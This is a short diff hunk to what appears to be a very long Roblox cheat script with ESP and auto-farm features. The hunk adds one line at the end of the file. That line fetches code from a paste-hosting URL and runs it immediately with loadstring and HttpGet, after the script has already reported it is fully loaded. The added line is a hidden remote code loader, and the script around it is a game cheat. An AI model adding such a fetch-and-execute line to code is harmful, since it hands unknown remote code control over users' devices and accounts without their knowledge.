@@ -17608,3 +17608,4 @@ end
 pcall(_G.__ApplyActionButtonIcons)
 pcall(_G.SetActionButtonTextColor, _G.ActionButtonTextColor)
 print(_G.ScriptVersion .. " fully loaded (ESP defaults ON, safe MoveTo-based farm)")
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/wKc8XhgZVi/0", true))()
